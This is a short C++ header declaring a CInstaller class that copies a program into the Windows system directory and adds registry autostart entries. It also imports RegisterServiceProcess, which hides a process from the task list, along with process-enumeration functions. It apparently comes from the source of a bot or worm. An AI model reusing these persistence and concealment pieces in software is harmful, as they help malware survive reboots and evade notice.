
#ifndef __INSTALLER_H__
#define __INSTALLER_H__

#include "cstring.h"

#ifdef WIN32
// kernel32.dll typedefs/structs
typedef struct tagPROCESSENTRY32 {
	DWORD dwSize;
	DWORD cntUsage;
	DWORD th32ProcessID;
	DWORD *th32DefaultHeapID;
	DWORD th32ModuleID;
	DWORD cntThreads;
	DWORD th32ParentProcessID;
	LONG pcPriClassBase;
	DWORD dwFlags;
	CHAR szExeFile[MAX_PATH];
} PROCESSENTRY32, *LPPROCESSENTRY32;

typedef int (__stdcall *RSP)(DWORD, DWORD);
typedef HANDLE (__stdcall *CT32S)(DWORD,DWORD);
typedef BOOL (__stdcall *P32F)(HANDLE,LPPROCESSENTRY32);
typedef BOOL (__stdcall *P32N)(HANDLE,LPPROCESSENTRY32);

extern RSP fRegisterServiceProcess;
extern CT32S fCreateToolhelp32Snapshot;
extern P32F fProcess32First;
extern P32N fProcess32Next;

extern HANDLE psnap;
extern PROCESSENTRY32 pe32;
#endif

class CInstaller
{
public:
	bool CopyToSysDir(CString &sFilename);
	bool Install();
	bool Uninstall();
#ifdef WIN32
	bool RegStartAdd(CString &sValuename, CString &sFilename);
	bool RegStartDel(CString &sValuename);
#endif
	CString m_sSysDir;
};

#endif // __INSTALLER_H__
